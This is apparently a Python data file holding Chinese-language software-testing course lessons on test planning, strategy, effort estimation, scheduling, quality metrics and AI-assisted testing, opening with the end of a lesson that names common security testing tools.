| Nessus | 漏洞扫描 | 企业级漏洞扫描器 |

## 本节小结

安全测试工具是安全工程师的武器库。核心工具推荐：
- **Burp Suite**（Web安全测试必备）
- **SQLMap**（SQL注入自动化）
- **Nmap**（端口扫描和服务发现）
- **OWASP ZAP**（免费替代Burp）

使用工具时注意**合法合规**，只对自己有授权的系统进行测试。"""
    },
]

# ============================================================
# 路径2: 测试计划编写与项目管理
# ============================================================
LESSON_CONTENT["测试计划编写与项目管理"] = [
    {
        "title": "第1节：测试计划的核心要素",
        "sort_order": 1,
        "knowledge_point": "测试计划基础",
        "time_estimate": 25,
        "content": """## 测试计划的定义与目的

**测试计划（Test Plan）** 是一份描述测试目标、范围、方法、资源和时间安排的正式文档。它是整个测试活动的"路线图"，指导团队按既定的策略和流程执行测试。

**测试计划的核心目的**：

1. **明确方向**：让所有干系人清楚测试的目标、范围和策略
2. **资源规划**：确定需要的人力、工具、环境和时间
3. **风险管理**：识别测试过程中的风险并制定应对措施
4. **沟通工具**：作为测试团队与项目经理、开发团队、业务方沟通的基础
5. **控制基准**：作为跟踪测试进度和评估测试质量的基准

> 一个好的测试计划不仅是文档，更是对整个测试过程的**思维演练**。

## IEEE 829标准概述

IEEE 829是软件测试文档的国际标准，定义了测试过程中需要产出的文档集合：

| 文档 | 内容 |
|------|------|
| 测试计划 | 测试范围、策略、资源、进度 |
| 测试设计规格 | 测试场景的详细设计 |
| 测试用例规格 | 具体测试用例 |
| 测试规程规格 | 测试执行步骤 |
| 测试日志 | 测试执行记录 |
| 测试缺陷报告 | 发现的缺陷 |
| 测试总结报告 | 测试结果汇总和分析 |

虽然在实际项目中不一定要严格遵循IEEE 829的所有文档，但理解其框架有助于建立规范的测试流程。

## 测试计划的六大核心要素

### 1. 测试范围（Test Scope）

定义**测什么和不测什么**。这是测试计划中最基础也是最重要的部分。

**需要明确的内容**：
- 哪些功能和模块在测试范围内
- 哪些功能明确排除在外（以及原因）
- 测试的类型（功能测试、性能测试、安全测试等）
- 测试环境范围（浏览器、操作系统、设备）

**示例**：
> **范围内**：用户登录/注册、商品搜索、购物车、订单管理模块的功能测试
> **范围外**：第三方支付接口（由支付服务商保证）、iOS App（由移动端团队负责）

### 2. 测试策略（Test Strategy）

定义**怎么测**，包括测试方法、测试级别、自动化策略等。这是测试计划的"灵魂"。

（下一节将详细展开测试策略的内容）

### 3. 资源规划（Resource Planning）

定义**谁来测、用什么测**。

| 资源类型 | 具体内容 |
|----------|----------|
| 人力资源 | 测试经理、测试工程师、自动化工程师等 |
| 环境资源 | 测试服务器、数据库、网络环境 |
| 工具资源 | 测试管理工具、自动化框架、性能测试工具 |
| 数据资源 | 测试数据集、测试账号、第三方接口沙箱 |

### 4. 进度安排（Schedule）

定义**什么时候测**，将测试活动分解为具体的时间节点。

- WBS（工作分解结构）任务分解
- 里程碑定义
- 资源日历安排
- 依赖关系标识

### 5. 风险管理（Risk Management）

识别测试过程中可能遇到的问题和应对措施。

**常见测试风险**：
- 开发延期导致测试时间被压缩
- 测试环境不稳定
- 关键测试人员离职
- 需求频繁变更
- 第三方服务不可用

**风险应对策略**：
- **规避**：改变计划以消除风险
- **缓解**：降低风险发生的概率或影响
- **转移**：将风险转移给第三方
- **接受**：承认风险并准备应急预案

### 6. 准入准出标准（Entry/Exit Criteria）

**准入标准**（放行进入测试）：
- 单元测试通过率达到95%+
- 冒烟测试通过
- 测试环境已部署完成
- 测试数据准备完毕

**准出标准**（放行进入生产）：
- 所有P0/P1用例100%通过
- 所有P2用例通过率≥95%
- 无Blocker/Critical级别未修复缺陷
- 性能指标满足需求
- 已获得产品/业务方验收签字

## 测试计划的误区

- **过于详尽导致难以维护**：计划赶不上变化，过细的计划反而不切实际
- **测试计划是测试经理的事**：应该让团队成员参与制定
- **写完就束之高阁**：测试计划需要持续更新和跟踪
- **忽略风险应对**：只识别风险不制定应对方案等于没识别

## 本节小结

测试计划是测试活动的管理基础。记住六大要素：**范围、策略、资源、进度、风险、准入准出**。下一节我们将深度展开测试策略的制定方法。"""
    },
    {
        "title": "第2节：测试策略制定",
        "sort_order": 2,
        "knowledge_point": "测试策略",
        "time_estimate": 25,
        "content": """## 测试策略 vs 测试计划

很多初学者将测试策略和测试计划混为一谈，实际上它们是不同层次的概念：

| 维度 | 测试策略（Test Strategy） | 测试计划（Test Plan） |
|------|--------------------------|----------------------|
| 关注点 | "怎么测" | "测什么、谁来测、什么时候测" |
| 范围 | 方法论层面 | 执行层面 |
| 变化频率 | 相对稳定（项目级） | 频繁更新（迭代级） |
| 典型内容 | 测试金字塔、自动化策略、测试类型选择 | 任务分配、时间表、环境要求 |
| 类比 | 作战思路 | 作战计划 |

**简单理解**：测试策略决定使用什么"打法"，测试计划将策略落地为具体执行方案。

## 基于风险的测试策略（Risk-Based Testing）

基于风险的测试是目前最主流的测试策略，核心思想是：**将有限的测试资源优先投入到风险最高的区域**。

### 风险评估矩阵

对每个功能模块从 **发生概率** 和 **影响程度** 两个维度评估：

| 影响 \\ 概率 | 低概率 | 中概率 | 高概率 |
|-------------|--------|--------|--------|
| **高影响** | 中风险 | 高风险 | 极高风险 |
| **中影响** | 低风险 | 中风险 | 高风险 |
| **低影响** | 极低风险 | 低风险 | 中风险 |

**极高风险区域**：核心业务流程、涉及资金交易、用户数据隐私
**低风险区域**：低频使用的辅助功能、内部管理页面

### 风险驱动的测试深度

| 风险级别 | 测试深度 | 说明 |
|----------|----------|------|
| 极高 | 全面测试 | 所有等价类+边界值+异常场景+安全+性能 |
| 高 | 深入测试 | 所有等价类+边界值+主要异常场景 |
| 中 | 标准测试 | 主要等价类+关键边界值 |
| 低 | 冒烟级测试 | 基本功能验证 |
| 极低 | 最低限度 | 部署验证即可 |

### 制定测试优先级

结合风险评估和业务影响，确定测试优先级：

**P0（冒烟测试）**：核心业务流程正常可用
- 用户注册 → 登录 → 核心操作 → 退出
- 阻塞性Bug优先修复和验证

**P1（主要功能）**：高频使用的业务功能
- 搜索、下单、支付等主要场景
- 回归测试必须覆盖

**P2（次要功能）**：辅助功能和边界场景
- 个人信息修改、历史记录查询等
- 时间允许时充分测试

**P3（边缘功能）**：低频功能和极端场景
- 罕见设备兼容性、极限数据量等

## 测试金字塔在策略中的应用

测试金字塔指导不同级别测试的投入比例：

'''
        ╱  E2E/UI  ╲         5-10%
       ╱─────────────╲
      ╱   API/集成测试  ╲      15-25%
     ╱───────────────────╲
    ╱      单元测试         ╲    60-70%
   ╱─────────────────────────╲
'''

**在实际策略中的应用**：

1. **单元测试**（最底层，量最大）：开发团队负责，合并代码前必须通过
2. **API/集成测试**（中间层）：测试团队负责，每次构建后自动执行
3. **UI/E2E测试**（顶层，量最少）：覆盖关键业务流程，每日或预发布前执行

**为什么要尽量向下移**？
- 底层测试执行快（秒级 vs 小时级）
- 底层测试更稳定（不受UI变化影响）
- 底层测试定位问题更精准

## 自动化测试策略

哪些应该自动化，哪些不应该？

**适合自动化的场景**：
- ✅ 回归测试用例（重复执行频率高）
- ✅ 数据驱动的测试（多组数据重复相同流程）
- ✅ API接口测试（稳定、易于自动化）
- ✅ 冒烟测试（CI/CD流水线必须）

**不适合自动化的场景**：
- ❌ 一次性测试
- ❌ 需要主观判断的测试（如UI美观度）
- ❌ 频繁变化的模块
- ❌ 探索性测试

### 自动化比例目标

| 测试类型 | 建议自动化比例 | 说明 |
|----------|---------------|------|
| 单元测试 | 80-90% | 开发主导 |
| API测试 | 70-85% | 测试主导 |
| UI测试 | 20-30% | 仅关键流程 |
| 性能测试 | 90%+ | 全自动化 |

## 测试策略文档化

一个好的测试策略文档应该包含：

1. **测试目标和范围**
2. **测试级别和类型选择**
3. **风险分析和优先级**
4. **自动化策略**
5. **环境策略**（测试环境架构、数据管理）
6. **工具选择**（测试管理、自动化框架、CI/CD）
7. **缺陷管理流程**

## 本节小结

好的测试策略是效率和质量之间的平衡艺术。记住三个关键词：**风险驱动、金字塔分层、合适的自动化比例**。策略不是一成不变的，要随着项目推进和反馈持续优化。"""
    },
    {
        "title": "第3节：测试工作量估算",
        "sort_order": 3,
        "knowledge_point": "工作量估算",
        "time_estimate": 20,
        "content": """## 测试工作量估算的重要性

工作量估算是测试计划中最具挑战性的环节。估算过低会导致测试不充分，估算过高则造成资源浪费。准确的估算能帮助项目经理合理分配资源、设定可行的里程碑。

## 常用估算方法

### 1. 专家判断法（Expert Judgment）

邀请有经验的测试专家基于历史经验进行估算。这是最简单但也最依赖个人经验的方法。

**使用步骤**：
1. 向专家介绍项目背景、需求范围和技术方案
2. 专家独立给出估算（人天/人时）
3. 收集各专家的估算，讨论差异
4. 达成共识

**优点**：快速、不需要大量历史数据
**缺点**：主观性强，需要经验丰富的专家

### 2. 类比估算法（Analogous Estimation）

参考历史类似项目的实际工作量来估算当前项目。

**示例**：
> 上一次电商项目（10个模块）的测试工作量为80人天
> 本次电商项目（12个模块，且复杂度相当）
> 估算工作量 = 80 × (12/10) × 调整系数 = 约96人天

**调整系数考虑因素**：
- 团队熟练度差异（0.8～1.2）
- 技术复杂度差异（0.9～1.5）
- 自动化覆盖程度（0.7～1.0）

### 3. 三点估算法（PERT）

结合乐观、最可能和悲观三种估算，计算加权平均值：

'''
期望工作量 = (乐观值 + 4 × 最可能值 + 悲观值) / 6
标准差 = (悲观值 - 乐观值) / 6
'''

**示例**：
- 乐观估算（一切顺利）：10人天
- 最可能估算（正常情况）：15人天
- 悲观估算（各种困难）：30人天
- 期望工作量 = (10 + 4×15 + 30) / 6 = 16.7人天

这种方式能有效减少单点估算的偏差，给出一个更合理的预期区间。

### 4. WBS任务分解法

**WBS（Work Breakdown Structure，工作分解结构）** 是将测试工作逐层分解为更小、更易估算的任务。

**测试WBS分解示例**：
'''
测试项目（总工作量）
├── 测试分析与设计（20%）
│   ├── 需求评审
│   ├── 测试方案设计
│   └── 测试用例编写
├── 测试环境搭建（10%）
│   ├── 环境部署
│   └── 测试数据准备
├── 测试执行（50%）
│   ├── 第一轮功能测试
│   ├── 回归测试（2-3轮）
│   └── 特殊测试（性能/安全等）
├── 缺陷管理（10%）
│   ├── 缺陷验证
│   └── 缺陷讨论
└── 测试报告（10%）
    ├── 测试总结报告
    └── 质量评估
'''

## 影响工作量的关键因素

| 因素 | 影响 |
|------|------|
| 需求明确度 | 需求越模糊，返工越多 |
| 系统复杂度 | 集成系统比独立系统耗时更多 |
| 团队经验 | 新手需要更多时间学习业务 |
| 自动化程度 | 高自动化减少回归测试时间 |
| 测试环境稳定性 | 环境故障消耗大量调试时间 |
| 开发质量 | Bug越多，回归和沟通时间越多 |
| 第三方依赖 | 等待第三方配合的时间 |
| 非功能性需求 | 性能/安全/兼容性测试额外工作量 |

## 测试用例时间估算

单个测试用例的执行时间估算：

| 用例类型 | 编写时间 | 执行时间 |
|----------|----------|----------|
| 简单功能用例 | 10-15分钟 | 3-5分钟 |
| 中等复杂度用例 | 20-30分钟 | 5-10分钟 |
| 复杂业务场景用例 | 30-60分钟 | 10-20分钟 |
| API自动化用例 | 20-40分钟 | <1分钟（自动执行） |
| UI自动化用例 | 40-90分钟 | <5分钟（自动执行） |

## 实用的工作量估算公式

'''
总测试工作量（人天）=
  用例编写 + (用例数 × 执行时间) + 缺陷管理 + 报告编写 + 缓冲（15-20%）
'''

其中缺陷管理的额外时间可按以下估算：
- 每发现1个Bug，额外消耗0.5-1小时（复现、记录、沟通）
- 每验证1个Bug修复，额外消耗0.25-0.5小时

## 常见估算错误

1. **乐观偏见**：总认为"这次会顺利"，应始终保留缓冲
2. **忽略沟通成本**：开会、邮件、即时通讯会消耗20-30%的时间
3. **忽略学习曲线**：新工具、新业务需要上手时间
4. **低估缺陷管理时间**：Bug的复现-记录-沟通-验证是隐形成本

## 本节小结

推荐使用**三点估算法+WBS分解**的组合：先用WBS分解任务，再对每个子任务进行三点估算，最后汇总。记住为不可预见因素预留15-20%的缓冲时间。"""
    },
    {
        "title": "第4节：测试进度与资源管理",
        "sort_order": 4,
        "knowledge_point": "进度与资源管理",
        "time_estimate": 25,
        "content": """## 用甘特图规划测试进度

甘特图（Gantt Chart）是最直观的项目进度管理工具，用横向条形图展示任务的开始时间、持续时长和依赖关系。

### 测试甘特图编制步骤

**第1步：列出所有测试任务**
'''
任务清单示例：
1. 测试计划编写                3天
2. 需求评审                    2天
3. 测试用例设计                5天
4. 测试用例评审                1天
5. 测试环境搭建                2天
6. 测试数据准备                1天
7. 第一轮功能测试（SIT1）      5天
8. 缺陷修复与验证              2天
9. 第二轮回归测试（SIT2）      3天
10. 性能测试                   2天
11. 缺陷修复与验证             1天
12. 第三轮回归测试（SIT3）     2天
13. UAT支持                   3天
14. 测试总结报告               1天
'''

**第2步：确定依赖关系**
'''
需求评审 → 测试用例设计
测试用例设计 → 测试用例评审
环境搭建 + 数据准备 → 可以开始测试执行
开发提测 → 第一轮功能测试
第一轮完成 → 缺陷修复 → 第二轮回归
'''

**第3步：分配资源和时间**

甘特图可以使用Excel、Microsoft Project、JIRA、禅道等工具绘制。关键是要标注：
- 每个任务的起止日期
- 任务的负责人
- 任务之间的依赖关系
- 关键里程碑

## 资源分配矩阵（RACI矩阵）

RACI矩阵明确了每个人在每个任务中的角色：

| 角色 | 含义 | 说明 |
|------|------|------|
| **R**（Responsible） | 执行者 | 实际完成任务的人 |
| **A**（Accountable） | 负责人 | 最终对结果负责的人（每任务仅1个A） |
| **C**（Consulted） | 被咨询者 | 提供意见/建议的人 |
| **I**（Informed） | 被通知者 | 需要知道进度/结果的人 |

**测试任务RACI示例**：

| 任务 | 测试工程师 | 测试经理 | 开发Leader | 产品经理 |
|------|-----------|---------|-----------|---------|
| 测试计划编写 | R | A | C | I |
| 用例设计 | R | A | C | I |
| 用例评审 | R | A | C | C |
| 功能测试 | R | A | I | I |
| 缺陷管理 | R | A | C | I |
| 测试报告 | R | A | C | I |

**RACI原则**：
- 每个任务必须有且只有**一个A**
- R和A可以是同一个人
- 避免过多的C（咨询过多降低效率）
- 确保每个关键干系人都在矩阵中

## 测试依赖管理

### 关键依赖关系识别

**测试活动对开发的依赖**（最常见）：
- 开发提测时间
- 冒烟测试通过率
- Bug修复的响应速度

**测试活动对环境的依赖**：
- 测试环境可用性
- 第三方服务/接口的稳定性
- 测试数据就绪

**测试内部依赖**：
- 先测试核心模块再测试边缘模块
- 自动化测试脚本的开发进度

### 依赖管理策略

1. **提前识别和文档化**：在测试计划中就列出所有依赖
2. **设置缓冲时间**：为不确定的依赖预留时间
3. **定期同步**：每日站会确认依赖状态
4. **制定应急预案**：如果某个依赖无法按时到位，Plan B是什么？

## 进度跟踪方法

### 1. 燃尽图（Burndown Chart）

追踪剩余工作量随时间的变化，直观显示进度是超前还是滞后。

### 2. 测试指标跟踪

| 指标 | 计算方式 | 健康值 |
|------|----------|--------|
| 用例执行率 | 已执行用例/总用例 | 按计划进行 |
| 用例通过率 | 通过用例/已执行用例 | >95% |
| 缺陷发现率 | 每周新增缺陷数 | 先升后降 |
| 缺陷修复率 | 已修复/总缺陷 | >90% |
| 测试覆盖率 | 已覆盖需求/总需求 | 100% P0/P1 |

### 3. 每日站会报告

每天测试人员在站会中汇报三件事：
- 昨天完成了什么测试？
- 今天计划测试什么？
- 有什么阻塞问题？

## 应对进度偏差

当测试进度落后计划时：

1. **评估影响**：延迟会影响发布吗？有没有关键路径？
2. **分析原因**：是工作量低估了？还是Bug太多？
3. **采取措施**：
   - 增加人力（注意Brooks法则：加人可能更慢）
   - 缩小范围（砍掉低优先级用例）
   - 延长测试窗口
   - 提高自动化覆盖率
   - 请求更多开发支持（更快修复Bug）

## 本节小结

"计划赶不上变化"是常态，但好的进度管理能帮你快速识别偏差并采取行动。核心工具：**甘特图规划、RACI分配职责、每日站会跟踪、指标仪表盘监控**。"""
    },
    {
        "title": "第5节：测试度量与质量报告",
        "sort_order": 5,
        "knowledge_point": "测试度量与报告",
        "time_estimate": 25,
        "content": """## 测试度量的目的

"无法度量就无法改进"——测试度量是评估测试效果、判断产品质量和指导决策的量化手段。

**度量 ≠ 考核**。度量的目的是发现问题和改进过程，而非简单地评价个人表现。

## 核心测试度量指标

### 1. 缺陷密度（Defect Density）

衡量代码质量的指标：

'''
缺陷密度 = 缺陷总数 / 代码规模（KLOC，千行代码）
'''

- 行业平均：10-20个/KLOC
- 优秀水平：<5个/KLOC
- 不同模块横向对比，找出"缺陷集群"区域

### 2. 用例通过率

反映测试执行的健康度：

'''
用例通过率 = 通过的用例数 / 已执行用例数 × 100%
'''

- **P0用例通过率**：理想为100%（有一条失败就不应发布）
- **整体通过率**：95%以上为健康水平

### 3. 需求覆盖率

确保所有需求都经过测试验证：

'''
需求覆盖率 = 有测试用例覆盖的需求数 / 总需求数 × 100%
'''

- P0/P1需求覆盖率应达到100%
- 需求追溯矩阵（RTM）是跟踪覆盖率的重要工具

### 4. 缺陷发现率（Defect Discovery Rate）

追踪缺陷发现的时间趋势：

```
缺陷发现率的理想曲线（Rayleigh曲线）：
    #
   ###
  #####      ← 峰值在测试中期
  #####
   ###
    #
    ↑ 随时间递减
```

**异常信号**：
- 缺陷率持续不降：开发一直在引入新Bug
- 缺陷率突然上升：刚加入了大量新功能或测试了新区域
- 缺陷率过早降为零：可能测试不够深入

### 5. 缺陷逃逸率（Defect Escape Rate）

衡量测试有效性的关键指标：

'''
缺陷逃逸率 = 生产环境发现的缺陷 / (测试发现的缺陷 + 生产发现的缺陷) × 100%
'''

- 优秀水平：<5%
- 过高则说明测试覆盖不足或测试策略有问题

### 6. 测试效率指标

| 指标 | 计算方式 | 用途 |
|------|----------|------|
| 人均用例执行率 | 执行用例数/测试人数/天 | 评估团队产能 |
| 自动化覆盖率 | 自动化用例数/总用例数 | 评估自动化程度 |
| 自动化执行通过率 | 自动化通过数/自动执行总数 | 环境/数据稳定性 |
| Bug平均修复时间 | 修复时长总和/Bug数 | 开发响应速度 |

## 质量报告模板

一份好的测试总结报告应该包含以下部分：

### 1. 测试概要
- 测试版本号、测试周期
- 测试范围（含明确的范围外项）
- 测试环境信息

### 2. 测试执行统计

| 项目 | 计划 | 实际 | 完成率 |
|------|------|------|--------|
| 测试用例总数 | 500 | 480 | 96% |
| 通过用例 | — | 462 | 96.25% |
| 失败用例 | — | 15 | 3.13% |
| 阻塞用例 | — | 3 | 0.63% |

### 3. 缺陷分析

| 严重级别 | 发现 | 已修复 | 未修复 | 修复率 |
|----------|------|--------|--------|--------|
| Blocker/Critical | 8 | 8 | 0 | 100% |
| Major | 25 | 22 | 3 | 88% |
| Minor | 40 | 35 | 5 | 87.5% |
| Trivial | 12 | 8 | 4 | 66.7% |
| **合计** | **85** | **73** | **12** | **85.9%** |

### 4. 模块质量分布

| 模块 | 缺陷数 | 缺陷密度 | 状态 |
|------|--------|----------|------|
| 用户模块 | 8 | 2/KLOC | ✅ 良好 |
| 订单模块 | 35 | 12/KLOC | ⚠️ 关注 |
| 支付模块 | 5 | 3/KLOC | ✅ 良好 |
| 商品模块 | 15 | 6/KLOC | ⚠️ 关注 |

### 5. 风险评估与建议

- 残存风险分析
- 不建议发布的模块/功能（如有）
- 上线后的监控建议
- 后续测试改进建议

### 6. 发布决策

基于以上数据，给出明确的发布建议：

| 决策 | 条件 |
|------|------|
| ✅ 批准发布 | 所有准出标准满足 |
| ⚠️ 有条件发布 | 存在已知问题但不影响核心功能 |
| ❌ 不建议发布 | 存在Blocker/Critical未修复缺陷 |

## 发布决策原则

发布决策不是测试团队单方面做出的，而是**项目干系人集体决策**。测试团队的职责是**提供客观、准确的质量数据**。

**测试经理的发布声明示例**：
> 经过三轮功能测试和一轮性能测试，共执行480个测试用例，通过率96.25%。发现85个缺陷，已修复73个（含全部Critical和Major），剩余12个Minor/Trivial缺陷已有规避方案。核心业务流程全部通过验证。**从测试角度，建议批准发布**，但建议上线后重点监控订单模块的性能和错误日志。

## 持续改进

每次测试结束后，结合度量数据进行回顾：
- 哪些类型的缺陷发现得太晚了？（改进测试策略）
- 哪些模块缺陷密度高？（分析原因，下次重点测试）
- 哪些用例是可以自动化的？（减少回归测试时间）

## 本节小结

测试度量不是为了好看的数字，而是为了**发现问题和驱动改进**。核心指标包括：缺陷密度、通过率、覆盖率、缺陷发现率、逃逸率。最终的质量报告要回答一个核心问题：**"这个版本可以发布吗？"**"""
    },
]

# ============================================================
# 路径3: AI测试与智能化
# ============================================================
LESSON_CONTENT["AI测试与智能化"] = [
    {
        "title": "第1节：AI在测试中的应用概览",
        "sort_order": 1,
        "knowledge_point": "AI测试概述",
        "time_estimate": 20,
        "content": """## AI测试的现状和发展

人工智能正在深刻改变软件测试的格局。从传统的"手工编写用例+人工执行"到"AI辅助生成+智能分析"，测试的效率和深度都在发生质的飞跃。

**市场发展趋势**：
- 2023年全球AI测试市场规模约为8亿美元
- 预计2028年将达到30亿美元（年复合增长率约30%）
- 越来越多的测试工具集成了AI能力（如Testim、Functionize、Mabl）

## AI能解决哪些测试问题？

### 1. 测试用例自动生成

传统方式中，测试工程师需要逐条分析需求、设计用例，工作量大且容易遗漏。AI可以通过以下方式辅助：

- **需求文档分析**：NLP技术自动解析需求文档，提取测试场景
- **代码路径分析**：基于控制流图生成覆盖所有分支的测试输入
- **组合测试生成**：自动生成参数全组合，确保覆盖边界场景
- **历史数据学习**：基于缺陷数据，自动生成缺陷高发区域的补充用例

### 2. 缺陷预测

通过分析代码变更和历史数据，AI能预测哪些模块最可能出Bug：

- **代码变更风险评分**：评估每次代码提交引入缺陷的概率
- **热点分析**：识别历史缺陷集中的"热点"模块
- **测试推荐**：基于风险评分推荐测试重点

### 3. 自愈自动化（Self-Healing Automation）

这是AI在自动化测试中最亮眼的应用。当UI元素的定位方式发生变化时，AI能自动识别并调整：

'''
场景：登录按钮的id从 "login-btn" 变为 "submit-login"

传统自动化：
- 测试脚本因找不到元素而失败
- 需要人工修改定位器

AI自愈：
- AI分析页面DOM的变化
- 通过元素外观、位置、文本等多维特征重新匹配
- 自动更新定位策略，测试继续执行
'''

### 4. 智能视觉验证

AI驱动的视觉回归测试不只是像素级对比，而是像人一样理解"什么样的差异是用户会注意到的"。

### 5. 日志分析与根因定位

当大量自动化测试失败时，AI能自动聚合和分析日志，帮助定位共同的根因，而不是让测试工程师逐个排查。

## AI测试的局限性

客观评估AI在测试中的能力边界很重要：

| 能做的 | 还不能做的 |
|--------|-----------|
| 辅助生成边界测试用例 | 理解复杂的业务规则 |
| 自动维护UI定位器 | 判断UI的"美观性" |
| 缺陷聚类和去重 | 确定缺陷的根本原因 |
| 视觉回归初步判断 | 理解文化和设计意图 |
| 日志模式匹配 | 创造性探索测试 |

**核心观点**：AI目前是测试工程师的**增强工具**而非**替代品**。它能处理大量重复、模式化的工作，但业务理解、测试策略制定和创造性测试仍然依赖人类工程师。

## 测试工程师如何应对AI浪潮？

1. **学习AI基础知识**：了解机器学习、NLP的基本概念
2. **掌握AI测试工具**：熟悉至少一款AI增强的测试工具
3. **提升业务分析能力**：AI能做模式识别，但无法替代业务洞察
4. **学习Prompt工程**：大模型时代，写好提示词就是新的编程
5. **关注数据质量**：AI效果依赖于训练数据，数据准备和标注是重要技能

## 本节小结

AI不是要取代测试工程师，而是让测试工程师从重复劳动中解放出来，专注于更需创造性和策略性的工作。接下来的章节将深入探讨AI在测试用例生成、视觉测试和缺陷分析中的具体应用。"""
    },
    {
        "title": "第2节：AI辅助测试用例生成",
        "sort_order": 2,
        "knowledge_point": "AI用例生成",
        "time_estimate": 25,
        "content": """## 基于需求文档的用例生成

利用NLP技术，AI可以从需求文档中自动提取测试场景。这是目前AI测试中最成熟的应用方向之一。

### 工作流程

'''
需求文档（自然语言） → NLP解析 → 实体/关系提取 → 
测试场景生成 → 测试用例结构化 → 人工审核确认
'''

### 示例：从需求文档生成测试场景

**需求原文**：
> 用户登录功能：用户输入用户名和密码，点击登录按钮。如果用户名和密码正确，跳转到首页。如果连续5次输入错误，账号锁定30分钟。

**AI生成的测试场景**：
1. 正确用户名+正确密码 → 登录成功，跳转首页
2. 正确用户名+错误密码 → 登录失败，提示错误
3. 正确的用户名+空密码 → 登录失败，提示"请输入密码"
4. 不存在的用户名 → 登录失败，提示"用户不存在"
5. 输入正确密码的第5次尝试 → 登录成功
6. 输入错误密码的第5次 → 账号锁定，提示"账号已锁定"
7. 锁定期间尝试登录 → 提示"账号已锁定，请30分钟后重试"
8. 锁定30分钟后重新登录 → 可以正常登录

AI可以自动推断出边界条件（第5次、锁定30分钟、空值等），而不仅仅是正向流程。

## 组合测试自动生成

组合测试（Combinatorial Testing）是生成参数组合的高效测试方法。AI可以智能地优化组合——**不需要测试所有组合，但保证覆盖关键交互**。

### Pairwise（两两组合）测试

研究表明，大多数缺陷都是由单个参数或两个参数的交互引起的。Pairwise测试保证每两个参数的所有取值组合至少出现一次。

'''python
from allpairspy import AllPairs

parameters = [
    ["Chrome", "Firefox", "Safari"],        # 浏览器
    ["Windows", "Mac", "Linux"],             # 操作系统
    ["English", "中文", "日本語"],            # 语言
    ["Mobile", "Desktop", "Tablet"]          # 设备
]

# 穷尽组合：3×3×3×3 = 81个用例
# Pairwise组合：通常只需9-12个用例即可覆盖所有两两组合
for i, pairs in enumerate(AllPairs(parameters)):
    print(f"用例{i+1}: {pairs}")
'''

### 实际效果

| 参数数量 | 每个参数值数 | 穷尽组合 | Pairwise组合 | 缺陷检出率 |
|----------|-------------|----------|-------------|-----------|
| 4 | 3 | 81 | 9-12 | 95%+ |
| 10 | 2 | 1024 | 8-12 | 90%+ |
| 5 | 5 | 3125 | 25-35 | 95%+ |

## 模糊测试（Fuzzing）

模糊测试是向程序输入大量随机、异常、非预期的数据，观察程序是否出现崩溃、内存泄漏等问题。

### AI增强的Fuzzing

传统Fuzzing是盲目的随机生成，而AI驱动的Fuzzing可以：

1. **学习输入结构**：分析合法输入的模式，生成"看起来合理但包含异常"的输入
2. **覆盖率引导**：基于代码覆盖率反馈，优先探索未覆盖的代码路径
3. **变异优化**：根据程序行为反馈智能调整变异策略

**AI Fuzzing工具**：
- **AFL（American Fuzzy Lop）**：经典的覆盖率引导Fuzzer
- **LibFuzzer**：与AFL类似的库级别Fuzzer
- **ClusterFuzz**：Google的大规模分布式Fuzzing平台
- **OSS-Fuzz**：开源项目的免费Fuzzing服务

### Fuzzing应用场景

- 文件解析器（PDF、图片、视频解码）
- 网络协议解析
- API接口（对JSON/XML结构的变异注入）
- 编译器/解释器

## 大模型Prompt设计

利用大语言模型（如GPT-4、Claude）生成测试用例，关键在于**Prompt工程**。

### 测试用例生成的Prompt模板

'''
你是一位资深的软件测试专家，请基于以下需求生成测试用例：

【需求描述】{需求描述}

请生成以下类型的测试用例：

1. **正向测试（Happy Path）**：正常流程的端到端场景，至少3个
2. **边界测试**：输入值的边界条件，至少5个
3. **异常测试**：各种错误输入和异常场景，至少5个
4. **安全测试**：权限、注入、敏感信息相关场景，至少3个

每个测试用例请包含：
- 用例标题
- 前置条件
- 测试步骤
- 预期结果

输出格式：Markdown表格
'''

### Prompt设计技巧

| 技巧 | 示例 |
|------|------|
| 角色设定 | "你是一位有10年经验的安全测试专家" |
| 格式约束 | "用Markdown表格输出，包含标题、步骤、预期结果三列" |
| 思维链 | "请先分析需求的关键点，然后逐步生成用例" |
| 否定强化 | "不要只生成正向场景，务必包含边界值和异常情况" |
| 样例引导 | 提供一个示例用例作为格式参考 |

### 生成后必须做的事

AI生成的测试用例不能直接使用，必须经过**人工审核**：
1. 验证业务逻辑是否正确
2. 补充业务特有的边界场景
3. 修正不符合实际的测试数据
4. 评估优先级并排序

## 本节小结

AI辅助测试用例生成的核心价值是**提高覆盖率、减少遗漏**，尤其是边界值和异常场景。方法包括：需求NLP解析、组合测试、模糊测试和大模型Prompt工程。记住，AI生成的内容永远是**辅助工具**，最终需要人工审核确认。"""
    },
    {
        "title": "第3节：视觉AI测试",
        "sort_order": 3,
        "knowledge_point": "视觉AI测试",
        "time_estimate": 25,
        "content": """## 视觉回归测试原理

视觉回归测试（Visual Regression Testing）通过截图对比来检测UI的意外变化。传统的手工UI比对效率低下且容易遗漏，视觉AI测试自动化了这一过程。

### 工作流程

'''
1. 采集基准截图（Baseline）
2. 执行测试时采集当前截图（Actual）
3. 使用图像对比算法计算差异
4. 根据阈值判断是否通过
5. 人工审核标记的差异（确认/忽略/更新基准）
'''

### 像素对比 vs AI智能对比

**像素对比**：直接比较每个像素的RGB值。
- 优点：精确、快速
- 缺点：敏感度过高，1像素偏移就会报错，产生大量误报

**AI智能对比**：
- 理解页面元素的"语义"
- 忽略不重要的差异（如渲染引擎微小的反锯齿差异）
- 聚焦于用户真正会注意到的视觉变化

'''python
# 概念示例：简单的截图对比
from PIL import Image
import numpy as np

def compare_screenshots(baseline_path, actual_path, threshold=0.01):
    baseline = Image.open(baseline_path)
    actual = Image.open(actual_path)
    
    baseline_array = np.array(baseline)
    actual_array = np.array(actual)
    
    if baseline_array.shape != actual_array.shape:
        return False, "截图尺寸不一致"
    
    diff = np.abs(baseline_array.astype(float) - actual_array.astype(float))
    diff_ratio = np.mean(diff > 30)  # 差异超过30的像素比例
    
    is_pass = diff_ratio <= threshold
    return is_pass, f"差异像素比例: {diff_ratio:.2%}"
'''

## 主流视觉测试工具

### 1. Applitools Eyes

业界最领先的AI驱动视觉测试平台。

**核心特性**：
- **Visual AI引擎**：模拟人眼感知，智能忽略微小差异
- **跨浏览器/设备**：一键在数百种浏览器和设备上对比
- **Ultrafast Grid**：云端并发渲染，极大提升速度
- **布局对比**：不仅对比外观，还检测布局变化

'''python
# Applitools Eyes 使用示例
from applitools.selenium import Eyes

eyes = Eyes()
eyes.api_key = "YOUR_API_KEY"

driver = webdriver.Chrome()
eyes.open(driver, "My App", "Login Page Test")

driver.get("https://myapp.com/login")
